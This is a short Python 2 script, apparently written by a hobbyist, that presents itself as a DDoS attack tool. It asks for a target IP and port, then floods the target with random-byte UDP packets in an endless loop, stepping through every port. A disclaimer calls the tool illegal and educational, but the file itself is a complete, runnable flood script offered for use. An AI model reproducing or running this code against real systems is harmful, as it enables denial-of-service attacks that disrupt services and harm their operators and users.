print ("\033[92m")
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet DDOS")
print " "
print("\033[91m DISCLAIMER - THIS TOOL IS ILLEGAL & IT'S ONLY FOR EDUCATION PURPOSE !  USE  IT AT YOUR OWN RISK , I AM NOT RESPONSIBLE FOR YOUR ACTION !\033[0m")
print " "
print " "
print "\033[96m CODED BY : ABHISHEK "
print " "
print(" \033[96m DON'T MISUSE IT ! ")
print " "
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
os.system("figle DDOS")
print ("\033[92m")
print "    DDOS ATTACK HAS STARTED !   "
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
